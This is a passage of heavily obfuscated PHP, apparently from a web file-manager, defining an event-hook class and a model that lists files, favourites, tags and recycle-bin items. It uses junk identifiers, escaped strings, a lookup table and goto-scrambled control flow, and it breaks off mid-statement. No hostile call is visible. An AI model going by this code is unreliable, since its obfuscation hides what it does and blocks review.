$F¨¿Ûî„©[1717] => $F¨¿Ûî„©[1718], $F¨¿Ûî„©[1719] => $F¨¿Ûî„©[1720], $F¨¿Ûî„©[1632] => array($F¨¿Ûî„©[1342] => $F¨¿Ûî„©[1721], $F¨¿Ûî„©[1636] => $F¨¿Ûî„©[1722], $F¨¿Ûî„©[1637] => $F¨¿Ûî„©[1723], $F¨¿Ûî„©[1724] => $F¨¿Ûî„©[1725], $F¨¿Ûî„©[1726] => $F¨¿Ûî„©[1727], $F¨¿Ûî„©[1728] => $F¨¿Ûî„©[1729], $F¨¿Ûî„©[1615] => $F¨¿Ûî„©[1730]))), $F¨¿Ûî„©[1731] => array($F¨¿Ûî„©[160] => $F¨¿Ûî„©[1732] . $F¨¿Ûî„©[1733], $F¨¿Ûî„©[1619] => array($F¨¿Ûî„©[1536] => $F¨¿Ûî„©[1734], $F¨¿Ûî„©[1538] => $F¨¿Ûî„©[1735], $F¨¿Ûî„©[1623] => $F¨¿Ûî„©[1708], $F¨¿Ûî„©[187] => $F¨¿Ûî„©[1736], $F¨¿Ûî„©[107] => $F¨¿Ûî„©[1737], $F¨¿Ûî„©[1642] => $F¨¿Ûî„©[1738], $F¨¿Ûî„©[1719] => $F¨¿Ûî„©[1739], $F¨¿Ûî„©[1715] => $F¨¿Ûî„©[1740], $F¨¿Ûî„©[1655] => $F¨¿Ûî„©[1741], $F¨¿Ûî„©[1705] => array($F¨¿Ûî„©[1714] => $F¨¿Ûî„©[1641], $F¨¿Ûî„©[1742] => $F¨¿Ûî„©[1743], $F¨¿Ûî„©[1712] => $F¨¿Ûî„©[1713], $F¨¿Ûî„©[1719] => $F¨¿Ûî„©[1720], $F¨¿Ûî„©[1715] => $F¨¿Ûî„©[1744], $F¨¿Ûî„©[1717] => $F¨¿Ûî„©[1718]))), $F¨¿Ûî„©[1745] => array($F¨¿Ûî„©[1619] => array($F¨¿Ûî„©[1746] => $F¨¿Ûî„©[1747], $F¨¿Ûî„©[1748] => $F¨¿Ûî„©[1749])), $F¨¿Ûî„©[1750] => array($F¨¿Ûî„©[1619] => array())); } } class Hook { private static $events = array(); public static function get($F·¹‘£—İ = false) { if (!$F·¹‘£—İ) { return self::$events; } else { return self::$events[$F·¹‘£—İ]; } } public static function apply($FŠ™Â´§ÙÑ, $F˜îåË§§± = array()) { $dåé‹ÔØÚõ = ActionApply($FŠ™Â´§ÙÑ, $F˜îåË§§±); if (is_string($FŠ™Â´§ÙÑ)) { Hook::trigger($FŠ™Â´§ÙÑ); } return $dåé‹ÔØÚõ; } public static function bind($a±ÚõêÊ×, $FË‹§½‚ì§, $B«¶•–‘œö = false) { $FšîôòÕ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset(self::$events[$a±ÚõêÊ×])) { self::$events[$a±ÚõêÊ×] = array(); } self::$events[$a±ÚõêÊ×][] = array($FšîôòÕ[1751] => $FË‹§½‚ì§, $FšîôòÕ[1752] => $B«¶•–‘œö, $FšîôòÕ[1753] => 0); } public static function once($DºÇÊßğİ, $bê¢İøÍ³ò) { self::bind($DºÇÊßğİ, $bê¢İøÍ³ò, !0); } public static function unbind($aã£õÀø‰, $E¤Ï•İÆ¾ = false) { if (!$E¤Ï•İÆ¾) { self::$events[$aã£õÀø‰] = array(); return; } $eŸ§‰òî• = self::$events[$aã£õÀø‰]; self::$events[$aã£õÀø‰] = array(); if (!is_array($eŸ§‰òî•)) { return; } for ($fÃ¿Ûõ¢àŒ = 0; $fÃ¿Ûõ¢àŒ < count($eŸ§‰òî•); $fÃ¿Ûõ¢àŒ++) { if ($eŸ§‰òî•[$fÃ¿Ûõ¢àŒ][$_SERVER[¼€¼ˆ¦‚¡][1751]] == $E¤Ï•İÆ¾) { continue; } self::$events[$aã£õÀø‰][] = $eŸ§‰òî•[$fÃ¿Ûõ¢àŒ]; } } public static function filter($bÀçœÖ·Ö„, $eæì÷‡Öë ) { goto e ‰„™Ğš•; e ‰„™Ğš•: $a­²¾ÙõÌ¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $f×¤òğßŸİ = self::$events; if (!isset($f×¤òğßŸİ[$bÀçœÖ·Ö„])) { return $eæì÷‡Öë ; } goto BøÓõÔˆÓ; Eƒ”íÁŠœë: for ($B¡ÍÍæÆ”Æ = 0; $B¡ÍÍæÆ”Æ < count($A’ÑôŸ×‚Î); $B¡ÍÍæÆ”Æ++) { $dï¶äê¾” = $A’ÑôŸ×‚Î[$B¡ÍÍæÆ”Æ]; if ($dï¶äê¾”[$a­²¾ÙõÌ¯[1752]] && $dï¶äê¾”[$a­²¾ÙõÌ¯[1753]] > 1) { continue; } self::$events[$bÀçœÖ·Ö„][$B¡ÍÍæÆ”Æ][$a­²¾ÙõÌ¯[1753]] = $dï¶äê¾”[$a­²¾ÙõÌ¯[1753]] + 1; $DòïĞİ÷Ñ¡ = self::apply($dï¶äê¾”[$a­²¾ÙõÌ¯[1751]], array($EÖŠ¿Ÿ¡ã)); if (gettype($DòïĞİ÷Ñ¡) == gettype($EÖŠ¿Ÿ¡ã)) { $EÖŠ¿Ÿ¡ã = $DòïĞİ÷Ñ¡; } } return $EÖŠ¿Ÿ¡ã; goto bÓŠ…èíó; BøÓõÔˆÓ: $A’ÑôŸ×‚Î = $f×¤òğßŸİ[$bÀçœÖ·Ö„]; $EÖŠ¿Ÿ¡ã = $eæì÷‡Öë ; if (!is_array($A’ÑôŸ×‚Î) || count($A’ÑôŸ×‚Î) == 0) { return $EÖŠ¿Ÿ¡ã; } goto Eƒ”íÁŠœë; bÓŠ…èíó: } public static function trigger($b§ÁÔŞ­ê¨) { goto aíŒ‚Ø…‘‘; aíŒ‚Ø…‘‘: $DÚÙçÚá†£ =& $_SERVER[¼€¼ˆ¦‚¡]; $Dâ¶³¯â¢­ = self::$events; $b…ô·©‘†Œ = !1; goto Fä·¤”‡´; Fä·¤”‡´: if (!isset($Dâ¶³¯â¢­[$b§ÁÔŞ­ê¨])) { return $b…ô·©‘†Œ; } $eÓ‡¶¬¬» = $Dâ¶³¯â¢­[$b§ÁÔŞ­ê¨]; if (!is_array($eÓ‡¶¬¬») || count($eÓ‡¶¬¬») == 0) { return $b…ô·©‘†Œ; } goto cÔçŞˆ×½¸; cÔçŞˆ×½¸: $b‘õ‘‡× = func_get_args(); array_shift($b‘õ‘‡×); for ($dÃéƒ»Ü´ = 0; $dÃéƒ»Ü´ < count($eÓ‡¶¬¬»); $dÃéƒ»Ü´++) { $aã‘ÔÇö = $eÓ‡¶¬¬»[$dÃéƒ»Ü´]; if ($aã‘ÔÇö[$DÚÙçÚá†£[1752]] && $aã‘ÔÇö[$DÚÙçÚá†£[1753]] > 1) { continue; } if (defined($DÚÙçÚá†£[1754]) && GLOBAL_LOG_HOOK) { write_log($b§ÁÔŞ­ê¨ . $DÚÙçÚá†£[1755] . $aã‘ÔÇö[$DÚÙçÚá†£[1751]], $DÚÙçÚá†£[1756]); } self::$events[$b§ÁÔŞ­ê¨][$dÃéƒ»Ü´][$DÚÙçÚá†£[1753]] = $aã‘ÔÇö[$DÚÙçÚá†£[1753]] + 1; $dáº×Å§æÃ = self::apply($aã‘ÔÇö[$DÚÙçÚá†£[1751]], $b‘õ‘‡×); if (defined($DÚÙçÚá†£[1754]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $DÚÙçÚá†£[1756]); if ($aã‘ÔÇö[$DÚÙçÚá†£[1753]] == 200) { $aÔÒÕÜ = is_array($aã‘ÔÇö[$DÚÙçÚá†£[1751]]) ? json_encode_force($aã‘ÔÇö[$DÚÙçÚá†£[1751]]) : $aã‘ÔÇö[$DÚÙçÚá†£[1751]]; write_log($DÚÙçÚá†£[1757] . $b§ÁÔŞ­ê¨ . $DÚÙçÚá†£[1758] . $aÔÒÕÜ, $DÚÙçÚá†£[1759]); } } $b…ô·©‘†Œ = is_null($dáº×Å§æÃ) ? $b…ô·©‘†Œ : $dáº×Å§æÃ; } goto fœš†à¶É; fœš†à¶É: return $b…ô·©‘†Œ; goto AÎ´¬÷™Ó; AÎ´¬÷™Ó: } } goto DµÑŸºã„; AÓØŠçˆÑœ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\143\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\155\x65" => "\151\x6f\x5f\163\157\x75\x72\x63\x65\137\155\145\x74\x61", "\x6d\x65\x74\x61\x46\x69\145\x6c\144" => "\x73\x6f\x75\x72\x63\x65\x49\104"); protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\151\155\x65", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\157\156"), array("\143\162\x65\141\x74\x65\x54\151\155\x65", "\164\151\x6d\145", "\151\156\163\145\162\x74", "\x66\x75\156\143\x74\x69\x6f\156"), array("\x76\x69\x65\x77\124\x69\x6d\x65", "\164\151\155\x65", "\x69\156\x73\x65\162\x74", "\146\165\x6e\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($b¹Õìºö…) { return $this->listSource(array($_SERVER[¼€¼ˆ¦‚¡][368] => $b¹Õìºö…)); } public function typeName($a—öéÓù•Î) { static $eÙ¤êÍŠµø = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $eÙ¤êÍŠµø[$a—öéÓù•Î . $_SERVER[¼€¼ˆ¦‚¡][33]]; } public function sourceListInfo($bñ½á“ÂòÒ, $D‘òÕ˜å·Ô = false) { goto d¦õÊœòÑ»; B¾±¼÷Î„Ë: return array_to_keyvalue($DŠÎ¾ïù, $D¹ŒëÛôß[369]); goto aÚ™Î™ß”; dÙÍˆİã¶: if (!$bñ½á“ÂòÒ) { return array(); } $DŠÎ¾ïù = $this->where(array($D¹ŒëÛôß[369] => array($D¹ŒëÛôß[7], $bñ½á“ÂòÒ)))->select(); $this->_listDataApply($DŠÎ¾ïù, $D‘òÕ˜å·Ô); goto B¾±¼÷Î„Ë; d¦õÊœòÑ»: $D¹ŒëÛôß =& $_SERVER[¼€¼ˆ¦‚¡]; $bñ½á“ÂòÒ = $bñ½á“ÂòÒ ? $bñ½á“ÂòÒ : array(); $bñ½á“ÂòÒ = array_filter(array_unique($bñ½á“ÂòÒ)); goto dÙÍˆİã¶; aÚ™Î™ß”: } public function pathInfoFilter($có‡„Áñç«) { goto eÊÍøÑğá‡; eÊÍøÑğá‡: $e²¤Â²ÎšÇ =& $_SERVER[¼€¼ˆ¦‚¡]; $có‡„Áñç«[$e²¤Â²ÎšÇ[75]] = KodIO::make($có‡„Áñç«[$e²¤Â²ÎšÇ[369]]); $có‡„Áñç«[$e²¤Â²ÎšÇ[29]] = $có‡„Áñç«[$e²¤Â²ÎšÇ[370]] == 1 ? $e²¤Â²ÎšÇ[76] : $e²¤Â²ÎšÇ[167]; goto E²¿š ±ê; BŸ¿¬¬”œõ: $dµ¤“ˆŠŸ‰ .= $e²¤Â²ÎšÇ[374]; $dµ¤“ˆŠŸ‰ .= $e²¤Â²ÎšÇ[375]; $a…Í“’²š´ = explode($e²¤Â²ÎšÇ[47], $dµ¤“ˆŠŸ‰); goto cÈÛ‚Ú÷‘; E²¿š ±ê: $có‡„Áñç«[$e²¤Â²ÎšÇ[371]] = $this->typeName($có‡„Áñç«[$e²¤Â²ÎšÇ[371]]); if ($có‡„Áñç«[$e²¤Â²ÎšÇ[370]] != 1) { $có‡„Áñç«[$e²¤Â²ÎšÇ[160]] = $có‡„Áñç«[$e²¤Â²ÎšÇ[372]]; unset($có‡„Áñç«[$e²¤Â²ÎšÇ[372]]); } $dµ¤“ˆŠŸ‰ = $e²¤Â²ÎšÇ[373]; goto BŸ¿¬¬”œõ; cÈÛ‚Ú÷‘: if (isset($có‡„Áñç«[$e²¤Â²ÎšÇ[376]]) && $có‡„Áñç«[$e²¤Â²ÎšÇ[376]][$e²¤Â²ÎšÇ[377]] == -1) { $a…Í“’²š´ = array_remove_value($a…Í“’²š´, $e²¤Â²ÎšÇ[187]); $a…Í“’²š´ = array_remove_value($a…Í“’²š´, $e²¤Â²ÎšÇ[107]); $a…Í“’²š´ = array_remove_value($a…Í“’²š´, $e²¤Â²ÎšÇ[378]); $a…Í“’²š´ = array_remove_value($a…Í“’²š´, $e²¤Â²ÎšÇ[379]); $a…Í“’²š´ = array_remove_value($a…Í“’²š´, $e²¤Â²ÎšÇ[77]); $a…Í“’²š´ = array_remove_value($a…Í“’²š´, $e²¤Â²ÎšÇ[380]); } $có‡„Áñç« = array_field_key($có‡„Áñç«, $a…Í“’²š´); return $có‡„Áñç«; goto Cº–ë™¯æí; Cº–ë™¯æí: } public function listUserFav() { goto a¨Ğ‘ êì; a¨Ğ‘ êì: $bÂÀÓà =& $_SERVER[¼€¼ˆ¦‚¡]; $b®í½ÊŸš = Model($bÂÀÓà[381])->listData(); $B´íÄˆ¡ÂŠ = array_filter_by_field($b®í½ÊŸš, $bÂÀÓà[29], $bÂÀÓà[382]); goto CËøÆæ³‰; B·ÈñĞÏÂï: foreach ($b®í½ÊŸš as &$a‚Œº¹ñ) { $a‚Œº¹ñ = array($bÂÀÓà[385] => $a‚Œº¹ñ[$bÂÀÓà[367]], $bÂÀÓà[386] => $a‚Œº¹ñ[$bÂÀÓà[28]], $bÂÀÓà[387] => $a‚Œº¹ñ[$bÂÀÓà[75]], $bÂÀÓà[388] => $a‚Œº¹ñ[$bÂÀÓà[29]], $bÂÀÓà[389] => $a‚Œº¹ñ[$bÂÀÓà[187]], $bÂÀÓà[390] => $a‚Œº¹ñ[$bÂÀÓà[107]]); if ($a‚Œº¹ñ[$bÂÀÓà[29]] == $bÂÀÓà[382] && $bÎŸâ¬ëö[$a‚Œº¹ñ[$bÂÀÓà[75]]]) { $a‚Œº¹ñ[$bÂÀÓà[391]] = $bÎŸâ¬ëö[$a‚Œº¹ñ[$bÂÀÓà[75]]]; } } return $b®í½ÊŸš; goto f‡ÎôÇ©Ğ­; CËøÆæ³‰: $B´íÄˆ¡ÂŠ = array_to_keyvalue($B´íÄˆ¡ÂŠ, $bÂÀÓà[33], $bÂÀÓà[75]); if ($B´íÄˆ¡ÂŠ) { $bÎŸâ¬ëö = $this->listSource(array($bÂÀÓà[383] => array($bÂÀÓà[384], $B´íÄˆ¡ÂŠ))); } $bÎŸâ¬ëö = array_to_keyvalue($bÎŸâ¬ëö[$bÂÀÓà[354]], $bÂÀÓà[369]); goto B·ÈñĞÏÂï; f‡ÎôÇ©Ğ­: } public function listUserTag($e›²ƒ“Ï®ê) { goto b‰÷¡´Ş¾ï; b‰÷¡´Ş¾ï: $F«èš˜¿ÁÅ =& $_SERVER[¼€¼ˆ¦‚¡]; $b¯¦ù›–áœ = Model($F«èš˜¿ÁÅ[392])->listData(); $C·‹Ìß„êñ = array_filter_by_field($b¯¦ù›–áœ, $F«èš˜¿ÁÅ[393], $e›²ƒ“Ï®ê); goto EÜ²ÊĞ”­ñ; EÜ²ÊĞ”­ñ: $C·‹Ìß„êñ = array_to_keyvalue($C·‹Ìß„êñ, $F«èš˜¿ÁÅ[33], $F«èš˜¿ÁÅ[75]); $BåˆÔÖ˜ò… = array(); if ($C·‹Ìß„êñ) { $a×É¡´… … = array($F«èš˜¿ÁÅ[383] => array($F«èš˜¿ÁÅ[384], $C·‹Ìß„êñ)); $BåˆÔÖ˜ò… = $this->listSource($a×É¡´… …); } goto F¿Ò®­¤Îë; F¿Ò®­¤Îë: $this->listUserTagClear($C·‹Ìß„êñ, $BåˆÔÖ˜ò…, $e›²ƒ“Ï®ê); return $BåˆÔÖ˜ò…; goto f¦ˆÌ•ªâ; f¦ˆÌ•ªâ: } private function listUserTagClear($b´†¥ùîÔ, $D‡Ì×ªÔ¬, $fèÙùèõ•ç) { goto c™´‡ùœ·; fì›äÈ·õØ: Model($eâƒ¡ë¥†[394])->removeFromTag($A¾Ñ‘ßùÚ”, $fèÙùèõ•ç); goto Eø¶ò§Ú²Ì; a—Ó¼‹¹£¹: $A¾Ñ‘ßùÚ” = array(); $F¹ô­½Ñ–¤ = array_to_keyvalue($D‡Ì×ªÔ¬[$eâƒ¡ë¥†[74]], $eâƒ¡ë¥†[33], $eâƒ¡ë¥†[369]); $bì‘ïÏËçÙ = array_to_keyvalue($D‡Ì×ªÔ¬[$eâƒ¡ë¥†[73]], $eâƒ¡ë¥†[33], $eâƒ¡ë¥†[369]); goto EÁæ´ºê; c™´‡ùœ·: $eâƒ¡ë¥† =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$b´†¥ùîÔ) { return; } if ($D‡Ì×ªÔ¬ && count($b´†¥ùîÔ) == $D‡Ì×ªÔ¬[$eâƒ¡ë¥†[351]][$eâƒ¡ë¥†[352]]) { return; } goto a—Ó¼‹¹£¹; EÁæ´ºê: $c¼ÅĞ…ˆ¸Í = array_merge($bì‘ïÏËçÙ, $F¹ô­½Ñ–¤); foreach ($b´†¥ùîÔ as $f£¢´¢Ë É) { if (!in_array($f£¢´¢Ë É, $c¼ÅĞ…ˆ¸Í)) { $A¾Ñ‘ßùÚ”[] = $f£¢´¢Ë É; } } if (!$A¾Ñ‘ßùÚ”) { return; } goto fì›äÈ·õØ; Eø¶ò§Ú²Ì: } public function listUserRecycle() { $F¤ÄµëÎ…Ä =& $_SERVER[¼€¼ˆ¦‚¡]; $AãˆÅæ«”Ä = Model($F¤ÄµëÎ…Ä[395])->listData(); if (!$AãˆÅæ«”Ä) { return array(); } $F¾î½¾š = array($F¤ÄµëÎ…Ä[383] => array($F¤ÄµëÎ…Ä[384], $AãˆÅæ«”Ä), $F¤ÄµëÎ…Ä[396] => 1); return $this->listSource($F¾î½¾š); } public function listSource($AïÄ—ĞÜŒš, $fç¿¹ƒ¾Ú = 3000) { goto BóÇªîÃ™µ; dÕ§ğ×ÅğŒ: return $dìˆ¹ÛÚÁ; goto e±ë­ñËŒ; BóÇªîÃ™µ: $b‹â–Ôº…é =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($AïÄ—ĞÜŒš[$b‹â–Ôº…é[397]])) { $AïÄ—ĞÜŒš[$b‹â–Ôº…é[397]] = 0; } $cõŒ›µáËã = $b‹â–Ôº…é[398]; goto FÌê¢¼ÂáÉ; FÌê¢¼ÂáÉ: $dìˆ¹ÛÚÁ = $this->field($cõŒ›µáËã)->_makeOrder()->where($AïÄ—ĞÜŒš)->selectPage($fç¿¹ƒ¾Ú); $this->_listDataApply($dìˆ¹ÛÚÁ[$b‹â–Ôº…é[354]]); $this->_listMake($dìˆ¹ÛÚÁ); goto dÕ§ğ×ÅğŒ; e±ë­ñËŒ: } protected function _makeOrder() { goto d’­Àµ³ÍÉ; E¸ÂåµÕÂÇ: if ($aïÍ¾ÛÁÅ† == $Aª«ˆï¥Ş™[28]) { } $Dµà‡ñ»Ü£ = $Aª«ˆï¥Ş™[409] . $fùË­ÁƒÓÚ[$aïÍ¾ÛÁÅ†] . $Aª«ˆï¥Ş™[50] . $A²¨°Ë‰¼ª[$fè†Øù£Õ]; return $this->order(rtrim(trim($Dµà‡ñ»Ü£), $Aª«ˆï¥Ş™[47])); goto e«‡Ş­ŸÛŠ; CöêÖó‘òá: $A²¨°Ë‰¼ª = array($Aª«ˆï¥Ş™[402] => $Aª«ˆï¥Ş™[403], $Aª«ˆï¥Ş™[404] => $Aª«ˆï¥Ş™[405]); $fùË­ÁƒÓÚ = array($Aª«ˆï¥Ş™[28] => $Aª«ˆï¥Ş™[28], $Aª«ˆï¥Ş™[77] => $Aª«ˆï¥Ş™[77], $Aª«ˆï¥Ş™[160] => $Aª«ˆï¥Ş™[372], $Aª«ˆï¥Ş™[378] => $Aª«ˆï¥Ş™[378], $Aª«ˆï¥Ş™[406] => $Aª«ˆï¥Ş™[379], $Aª«ˆï¥Ş™[187] => $Aª«ˆï¥Ş™[187], $Aª«ˆï¥Ş™[107] => $Aª«ˆï¥Ş™[107]); $aïÍ¾ÛÁÅ† = Input::get($Aª«ˆï¥Ş™[407], $Aª«ˆï¥Ş™[7], $D£±¹ö¸§, array_keys($fùË­ÁƒÓÚ)); goto Bğºïê¢‹Í; d’­Àµ³ÍÉ: $Aª«ˆï¥Ş™ =& $_SERVER[¼€¼ˆ¦‚¡]; $D£±¹ö¸§ = Model($Aª«ˆï¥Ş™[399])->get($Aª«ˆï¥Ş™[400]); $AË×‰àŒÛØ = Model($Aª«ˆï¥Ş™[399])->get($Aª«ˆï¥Ş™[401]); goto CöêÖó‘òá; Bğºïê¢‹Í: $fè†Øù£Õ = Input::get($Aª«ˆï¥Ş™[408], $Aª«ˆï¥Ş™[7], $AË×‰àŒÛØ, array_keys($A²¨°Ë‰¼ª)); if (!in_array($aïÍ¾ÛÁÅ†, array_keys($fùË­ÁƒÓÚ))) { $aïÍ¾ÛÁÅ† = $Aª«ˆï¥Ş™[28]; } if (!in_array($fè†Øù£Õ, array_keys($A²¨°Ë‰¼ª))) { $aïÍ¾ÛÁÅ† = $Aª«ˆï¥Ş™[402]; } goto E¸ÂåµÕÂÇ; e«‡Ş­ŸÛŠ: } protected function _listDataApplyItem($BÑ®°Ïí²±, $A¡£‹íñÓ = false) { $EïÛøÊ¹Õ = array($BÑ®°Ïí²±); $this->_listDataApply($EïÛøÊ¹Õ, $A¡£‹íñÓ); return $EïÛøÊ¹Õ[0]; } protected function _listDataApply(&$E»„˜”¹ùŸ, $F»àñ—Ë»¾ = false) { goto Cˆïêâ£¹; F™‡™Ú‘Ö¯: $this->_listAppendPath($E»„˜”¹ùŸ); $this->_listAppendAuth($E»„˜”¹ùŸ); $this->_listAppendSourceInfo($E»„˜”¹ùŸ, $D¾÷¬Í¡æ­); goto d÷”õŸ·àî; d÷”õŸ·àî: $this->_listAppendUser($E»„˜”¹ùŸ); $this->_listFilterInfo($E»„˜”¹ùŸ, $F»àñ—Ë»¾); goto A˜ƒøŠï; b¼¨ˆÈ‰×è: $D¾÷¬Í¡æ­ = array_unique($D¾÷¬Í¡æ­); $this->_listSourceCache($E»„˜”¹ùŸ); if (!$F»àñ—Ë»¾) { $this->_listAppendMeta($E»„˜”¹ùŸ, $D¾÷¬Í¡æ­); $this->_listAppendFileMeta($E»„˜”¹ùŸ, $D¾÷¬Í¡æ­); $this->_listAppendChildren($E»„˜”¹ùŸ, $D¾÷¬Í¡æ­); } goto F™‡™Ú‘Ö¯; Cˆïêâ£¹: $AĞÁâ¡ªôë =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$E»„˜”¹ùŸ) { $E»„˜”¹ùŸ = array(); return; } $D¾÷¬Í¡æ­ = array_to_keyvalue($E»„˜”¹ùŸ, $AĞÁâ¡ªôë[33], $AĞÁâ¡ªôë[369]); goto b¼¨ˆÈ‰×è; A˜ƒøŠï: } protected function _listSourceCache($DáÚêæ¼Èâ) { $F£Ü™‘“º‘ =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($DáÚêæ¼Èâ as $c´¹áÎ‘¢) { self::$cacheSourceInfo[$F£Ü™‘“º‘[410] . $c´¹áÎ‘¢[$F£Ü™‘“º‘[369]]] = $c´¹áÎ‘¢; } } protected function _listFilterInfo(&$bÄ®µçÓŠ, $FßÂöİøÊ® = false) { $Eøˆ‹Ğ–ßœ =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($bÄ®µçÓŠ as &$DĞßõ˜Ò§) { $DĞßõ˜Ò§ = $this->pathInfoFilter($DĞßõ˜Ò§); self::$cachePathInfo[$Eøˆ‹Ğ–ßœ[411] . intval($FßÂöİøÊ®) . $Eøˆ‹Ğ–ßœ[412] . $DĞßõ˜Ò§[$Eøˆ‹Ğ–ßœ[369]]] = $DĞßõ˜Ò§; } } protected function _listMake(&$Dëæ”Øºí•) { $BĞñæ”¢†¡ =& $_SERVER[¼€¼ˆ¦‚¡]; $Dëæ”Øºí•[$BĞñæ”¢†¡[74]] = array(); $Dëæ”Øºí•[$BĞñæ”¢†¡[73]] = array(); foreach ($Dëæ”Øºí•[$BĞñæ”¢†¡[354]] as $fÔ”ç°†·“) { $CØ¡¶¨×Øâ = $fÔ”ç°†·“[$BĞñæ”¢†¡[370]] == 1 ? $BĞñæ”¢†¡[74] : $BĞñæ”¢†¡[73]; $Dëæ”Øºí•[$CØ¡¶¨×Øâ][] = $fÔ”ç°†·“; } unset($Dëæ”Øºí•[$BĞñæ”¢†¡[354]]); } protected function _listAppendMeta(&$C°‡ùÂŒÒ´, $d“ã˜Š° —) { goto DšØ£…ø‘; B–½ô‡¡: if (!$eÑ°‹Úâë) { return; } $få²·‚¦Ñ  = array($FìÆ„Êò†Ï[415], $FìÆ„Êò†Ï[416]); $a¯“ä±¾”• = array(); goto FØİ‰çÔÅİ; DšØ£…ø‘: $FìÆ„Êò†Ï =& $_SERVER[¼€¼ˆ¦‚¡]; $C£‹Š¸Á–­ = array($FìÆ„Êò†Ï[383] => array($FìÆ„Êò†Ï[384], $d“ã˜Š° —)); $eÑ°‹Úâë = Model($FìÆ„Êò†Ï[413])->field($FìÆ„Êò†Ï[414])->where($C£‹Š¸Á–­)->select(); goto B–½ô‡¡; FØİ‰çÔÅİ: foreach ($eÑ°‹Úâë as $aÍÃ‰…ÙÃ´) { if (!isset($a¯“ä±¾”•[$aÍÃ‰…ÙÃ´[$FìÆ„Êò†Ï[369]]])) { $a¯“ä±¾”•[$aÍÃ‰…ÙÃ´[$FìÆ„Êò†Ï[369]]] = array(); } if (in_array($aÍÃ‰…ÙÃ´[$FìÆ„Êò†Ï[89]], $få²·‚¦Ñ )) { continue; } $a¯“ä±¾”•[$aÍÃ‰…ÙÃ´[$FìÆ„Êò†Ï[369]]][$aÍÃ‰…ÙÃ´[$FìÆ„Êò†Ï[89]]] = $aÍÃ‰…ÙÃ´[$FìÆ„Êò†Ï[359]]; } foreach ($C°‡ùÂŒÒ´ as &$f¹¾œàŠŒ) { $f¹¾œàŠŒ[$FìÆ„Êò†Ï[417]] = !1; if (isset($a¯“ä±¾”•[$f¹¾œàŠŒ[$FìÆ„Êò†Ï[369]]])) { $f¹¾œàŠŒ[$FìÆ„Êò†Ï[417]] = $a¯“ä±¾”•[$f¹¾œàŠŒ[$FìÆ„Êò†Ï[369]]]; } if ($this->fileIsLock($f¹¾œàŠŒ) && $f¹¾œàŠŒ[$FìÆ„Êò†Ï[376]]) { $D¸¹§‚ñË = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $f¹¾œàŠŒ[$FìÆ„Êò†Ï[376]][$FìÆ„Êò†Ï[377]] = AuthModel::authDisable($f¹¾œàŠŒ[$FìÆ„Êò†Ï[376]][$FìÆ„Êò†Ï[377]], $D¸¹§‚ñË); $f¹¾œàŠŒ[$FìÆ„Êò†Ï[376]][$FìÆ„Êò†Ï[418]][$FìÆ„Êò†Ï[376]] = $f¹¾œàŠŒ[$FìÆ„Êò†Ï[376]][$FìÆ„Êò†Ï[377]]; } } goto açòŠõ”±ì; açòŠõ”±ì: } protected function _listAppendFileMeta(&$EÇÁµÏğ“Ø, $dŠ»³ø†È•) { goto B‰¶öÒÃ; B‰¶öÒÃ: $B³¢™ïùŸä =& $_SERVER[¼€¼ˆ¦‚¡]; $aˆœÛ—¿ = array_to_keyvalue($EÇÁµÏğ“Ø, $B³¢™ïùŸä[33], $B³¢™ïùŸä[419]); $aˆœÛ—¿ = array_filter(array_unique($aˆœÛ—¿)); goto Cõ’Õï²„¦; DÑ¦±¥¥‹: foreach ($EÇÁµÏğ“Ø as &$añ¯ê¥´Ä) { goto b…×çÛ±™ñ; b…×çÛ±™ñ: $BôØˆÊà = $añ¯ê¥´Ä[$B³¢™ïùŸä[419]]; if (!$BôØˆÊà || !isset($D˜º¸ó”Åø[$BôØˆÊà])) { continue; } $D´”õ×²æš = $D˜º¸ó”Åø[$BôØˆÊà]; goto b¥Âë…­; Eî¢é¶µ³„: if (isset($añ¯ê¥´Ä[$B³¢™ïùŸä[162]][$B³¢™ïùŸä[426]])) { $añ¯ê¥´Ä[$B³¢™ïùŸä[426]] = json_decode($añ¯ê¥´Ä[$B³¢™ïùŸä[162]][$B³¢™ïùŸä[426]], !0); unset($añ¯ê¥´Ä[$B³¢™ïùŸä[162]][$B³¢™ïùŸä[426]]); } goto dœÓ¬ÎšŒ›; b¥Âë…­: $D´”õ×²æš[$B³¢™ïùŸä[77]] = $añ¯ê¥´Ä[$B³¢™ïùŸä[77]]; $D´”õ×²æš[$B³¢™ïùŸä[28]] = $añ¯ê¥´Ä[$B³¢™ïùŸä[28]]; self::$cacheFileInfo[$B³¢™ïùŸä[425] . $BôØˆÊà] = $D´”õ×²æš; goto DÌ¢ƒ­…ÙÂ; DÌ¢ƒ­…ÙÂ: unset($D˜º¸ó”Åø[$BôØˆÊà][$B³¢™ïùŸä[75]]); $FÏçµ´º¬½ = is_array($CŒŒ“‘°Ú’[$BôØˆÊà]) ? $CŒŒ“‘°Ú’[$BôØˆÊà] : array(); $añ¯ê¥´Ä[$B³¢™ïùŸä[162]] = array_merge($FÏçµ´º¬½, $D˜º¸ó”Åø[$BôØˆÊà]); goto Eî¢é¶µ³„; dœÓ¬ÎšŒ›: } goto dì¿µğèØÖ; Cõ’Õï²„¦: if (!$aˆœÛ—¿) { return; } $eäóåÉ×‘ = array($B³¢™ïùŸä[420] => array($B³¢™ïùŸä[384], $aˆœÛ—¿)); $F×Ö·–º› = $B³¢™ïùŸä[421]; goto bÔ¶‹àè™“; bÔ¶‹àè™“: $D˜º¸ó”Åø = 